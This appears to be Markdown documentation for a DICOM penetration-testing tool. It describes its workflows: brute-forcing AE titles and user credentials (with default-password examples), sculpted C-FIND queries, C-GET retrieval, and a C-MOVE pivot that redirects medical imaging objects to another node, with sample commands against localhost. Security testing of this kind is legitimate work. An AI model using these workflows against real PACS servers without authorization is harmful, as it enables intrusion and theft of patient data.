# Pentest workflows

The workflow drivers are scripted, multi-step DICOM exchanges — recon and
query/retrieve flows that reach the state (a discovered AE title, a valid
credential) a DAST run should start from. They share `DICOMSession` (and its `DICOMSocket` transport) with the
[DAST](dast.md) path and are **role-agnostic**: issuer drivers act as an SCU
against a server, responders act as an SCP against a client.

## Issuer workflows (act as SCU, target a server)

C-SCARE ships **5 scripted workflows**, driven via `c-scare wf …`:

| ID | Subcommand | Workflow | What it does | Function |
|----|------------|----------|--------------|----------|
| **W1** | `ae-brute` | AE-title brute force | Attempt association per Called AE Title and read each accepted AET's Application Context payload (AC UID, Implementation Class UID, Version Name) | `ae_brute()` |
| **W2** | `cred-brute` | Credential brute force | Brute-force User Identity credentials, surfacing the `0x59` server response | `cred_brute()` |
| **W3** | `find` | Sculpted C-FIND | Query with an exact return-key set — a key is returned only if you asked for it | `build_query()` + `DICOMSession.c_find` |
| **W4** | `get` | C-GET retrieval | Retrieve matched objects over the same association | `DICOMSession.c_get` |
| **W5** | `move` | C-MOVE pivot | Redirect matched objects to a third AE | `DICOMSession.c_move` |

`ae_brute()` and `cred_brute()` treat the AE-title and credential axes as
**independent**: an accepted-or-rejected-for-any-other-reason association means
the AET is valid (`aet_recognized`), so the operator can fix the AET axis (W1)
before brute-forcing credentials (W2).

### Examples

```bash
# W1 — Brute Called AE Titles and read each accepted AET's AC payload
c-scare wf --ip 127.0.0.1 --port 4242 ae-brute --aets PACS,RADIOLOGY_BACKUP_2017

# W2 — Brute User Identity credentials, surfacing the 0x59 server response
c-scare wf --ip 127.0.0.1 --port 4242 cred-brute --ae-title PACS \
    --creds admin:admin,svc:changeme

# W3 — Sculpted C-FIND: request exactly the keys you want back
c-scare wf --ip 127.0.0.1 --port 4242 find --ae-title PACS --model study \
    --return-key 0008,1030 --return-key 0020,000D

# W5 — C-MOVE pivot: redirect matched objects to a third AE
c-scare wf --ip 127.0.0.1 --port 4242 move --ae-title PACS \
    --dest-ae RESEARCH_VIEWER --match 0020,000D,UI=1.2.3
```

(`python -m c_scare …` is equivalent to the `c-scare` console command.)

## Responder workflows (act as SCP, target a client)

`responders.py` provides the SCP side — a `WorkflowResponder` that exercises a
connecting **SCU** client. It mirrors the issuer workflows: `known_aets`
enforces the W1 AE-title axis, `require_identity` enforces the W2 credential
axis, and the DIMSE RSP builders / `accept_association()` shape the responses
the client parses.

## See also

- [Black-box DAST](dast.md) — the attack catalog these workflows set up state for.
- [Grey-box fuzzing](fuzzing.md) — coverage-guided fuzzing of the same targets.
- [protocol.md](protocol.md) — byte-level DICOM structure (state machine, DIMSE).
